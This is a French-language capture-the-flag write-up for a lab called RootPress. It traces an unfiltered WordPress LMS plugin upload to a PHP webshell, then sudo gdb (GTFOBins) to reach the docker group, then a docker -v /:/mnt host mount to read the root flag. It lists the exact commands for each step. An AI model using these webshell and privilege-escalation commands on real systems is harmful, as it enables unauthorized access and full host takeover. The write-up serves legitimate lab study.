---
doc_kind: writeup
title: "ThunderCipher RootPress - upload WordPress non filtre puis GTFOBins gdb et evasion Docker"
category: web
slug: rootpress-wp-upload-gdb-docker-escape
created: 2026-10-29
status: solved
tags:
  - wordpress-upload
  - gtfobins-gdb
  - docker-group-escape
  - lms-plugin
source: thundercipher.in/labs
target: "WordPress plugin LMS + sudo gdb"
---
# ThunderCipher RootPress - upload WordPress non filtre puis GTFOBins gdb et evasion Docker

## Challenge Summary

- Source: thundercipher.in/labs
- Target: WordPress plugin LMS + sudo gdb
- Goal: Un plugin LMS WordPress autorise l'upload non filtre d'un webshell PHP; l'utilisateur obtenu a un sudo NOPASSWD sur gdb (GTFOBins) qui ouvre un shell dans le groupe docker.

## Initial Signals

- Entry point: see Exploit Chain step 1
- Visible hints: n/a (see source writeup)
- First confirming probe: see Exploit Chain

## Exploit Chain

1. Enumeration wp-json users + fuzzing plugins.
2. ffuf sur dossier uploads -> dossier listable non protege -> shell.php.
3. curl shell.php?cmd=id -> RCE confirmee.
4. sudo -l -> NOPASSWD: /usr/bin/gdb.
5. sudo gdb -nx -ex 'python import os;os.system("id")' -> GTFOBins gdb, user dans groupe docker.
6. docker run -v /:/mnt --rm <image> cat /mnt/root/root.txt -> flag.

## Key Evidence

- Groupe docker confirme apres GTFOBins gdb; flag retourne via docker run -v /:/mnt.

## Dead Ends

- n/a (see Reusable Lessons)

## Payloads And Commands

```text
GTFOBins gdb -ex 'python import os;os.system(...)'; docker run -v /:/mnt --rm <image> cat /mnt/root/root.txt.
```

## Flag / Outcome

- Flag obtenu, chaine confirmee de bout en bout.

## Reusable Lessons

- Chercher les dossiers uploads listables d'autres plugins que les plus connus; tout user dans le groupe docker (meme sans acces internet) = root via montage -v /:/mnt sur une image deja en cache.

## Pattern Candidates

- Voir pattern associe de meme slug.
